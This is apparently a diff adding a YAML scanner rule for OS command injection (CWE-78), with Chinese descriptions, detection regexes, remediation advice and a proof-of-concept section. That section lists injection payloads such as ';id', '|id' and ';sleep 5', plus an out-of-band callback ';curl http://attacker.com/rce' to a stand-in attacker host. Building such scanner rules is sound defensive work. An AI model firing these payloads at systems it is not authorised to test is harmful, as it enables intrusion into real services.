@@ -1,0 +1,116 @@
+id: "rule-command-injection"
+name: "OS Command Injection"
+name_cn: "操作系统命令注入"
+description: "用户可控输入未经过滤直接拼接到系统命令执行函数（如 system/exec/popen），导致攻击者可执行任意系统命令"
+
+owasp_category: "A03-injection"
+owasp_subcategory: "Command Injection"
+cwe_id: "CWE-78"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  base_score: 9.8
+  severity: "critical"
+
+detection:
+  methods: ["DAST", "SAST"]
+  dast_signals:
+    high_specificity:
+      - type: "command_execution_confirmed"
+        pattern: "out_of_band_command_callback_or_content"
+        confidence: 0.98
+      - type: "command_output_in_response"
+        pattern: "uid=\\d+\\(root\\)|total \\d+|drwxr"
+        confidence: 0.95
+    medium_specificity:
+      - type: "response_time_diff"
+        pattern: "sleep_command_delays_response"
+        confidence: 0.75
+      - type: "error_message"
+        pattern: "(command not found|No such file|syntax error|unexpected)"
+        confidence: 0.70
+    low_specificity:
+      - type: "executable_parameter"
+        pattern: "(cmd|exec|command|shell|system|ping|host|nslookup|file)="
+        confidence: 0.30
+  sast_patterns:
+    - language: "go"
+      pattern: "exec\\.Command\\([^)]*\\+|exec\\.Command\\(.*os\\.Expand"
+      confidence: 0.85
+    - language: "python"
+      pattern: "os\\.system\\([^)]*\\+|subprocess\\.call\\(.*shell=True"
+      confidence: 0.85
+    - language: "php"
+      pattern: "system\\(|exec\\(|shell_exec\\(|popen\\("
+      confidence: 0.85
+    - language: "java"
+      pattern: "Runtime\\.getRuntime\\(\\)\\.exec\\([^)]*\\+|ProcessBuilder"
+      confidence: 0.85
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "content_validation"
+      condition: "no_command_output_or_callback"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    GET {{url}}?{{param}}={{payload}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Accept: */*
+    Connection: close
+  payloads:
+    - name: "basic_semicolon"
+      value: ";id"
+      description: "分号分隔执行 id 命令"
+      risk: "medium"
+    - name: "pipe"
+      value: "|id"
+      description: "管道执行 id 命令"
+      risk: "medium"
+    - name: "and_operator"
+      value: "&&id"
+      description: "AND 运算符"
+      risk: "medium"
+    - name: "or_operator"
+      value: "||id"
+      description: "OR 运算符"
+      risk: "medium"
+    - name: "time_based"
+      value: ";sleep 5"
+      description: "时间盲注验证"
+      risk: "low"
+    - name: "oob_callback"
+      value: ";curl http://attacker.com/rce"
+      description: "OOB 回调确认 RCE"
+      risk: "high"
+  verification:
+    - type: "content_match"
+      pattern: "uid=\\d+\\(root\\)|uid=\\d+\\(www-data\\)"
+      description: "响应中出现命令执行结果"
+    - type: "callback_received"
+      description: "攻击者服务器收到 curl/wget 回调"
+    - type: "time_diff"
+      description: "sleep 命令导致响应延迟"
+
+remediation:
+  priority: "P0"
+  summary: "禁止拼接用户输入到系统命令，使用安全的参数化执行"
+  details:
+    - "避免使用 system/exec/popen 等函数，使用语言原生 API 替代"
+    - "如必须执行命令，使用参数数组形式（exec.Command(\"cmd\", arg1, arg2)），禁止 shell 解析"
+    - "对用户输入做严格白名单校验"
+    - "使用沙箱/容器隔离执行环境"
+    - "最小权限运行服务进程"
+  references:
+    - "https://owasp.org/Top10/A03_2021-Injection/"
+    - "https://cwe.mitre.org/data/definitions/78.html"
+
+knowledge_source:
+  file: "知识库/injection-test.md"
+  methodology: "src-value-hunting.md §3 RCE/代码执行链"
